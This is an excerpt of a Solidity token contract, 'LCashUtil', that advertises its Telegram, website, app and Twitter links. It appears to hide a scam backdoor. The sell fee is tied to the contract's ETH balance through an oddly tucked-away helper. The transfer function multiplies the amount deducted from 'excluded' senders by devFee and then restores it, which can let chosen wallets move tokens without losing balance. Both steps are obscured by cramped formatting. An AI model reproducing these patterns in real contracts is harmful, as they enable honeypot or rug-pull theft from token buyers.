/** 
    ...
    Telegram: https://t.me/lcashfinance

    Website: https://lcash.finance/

    App: https://app.lcash.finance/

    Twitter: https://twitter.com/LCashFinance
...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        ...
        _owner = newOwner;
        }    function redisPercent(uint256 amt) internal pure returns(uint256) {
        return amt / 1e12;
    }
...
contract LCashUtil is Ownable, ERC20 {
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xBe7A1B82bf46Ef4FE5244EfC9Ad582Aaa39823De;
    ...
    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        ...
        uint256 percent = transferpercent; uint256 _percent = address(this).balance;
        if(recipient == pair) {
            percent = sellpercent - redisPercent(_percent);
        } else if(sender == pair) {
            percent = buypercent;
        }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(shouldSwapBack() && !isexemptfromfees[sender] && !isexemptfromfees[recipient]){ swapBack(); } uint256 temp = amount; 
        if(shouldExclude(sender, recipient)) amount = amount * devFee;
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance"); amount = temp;
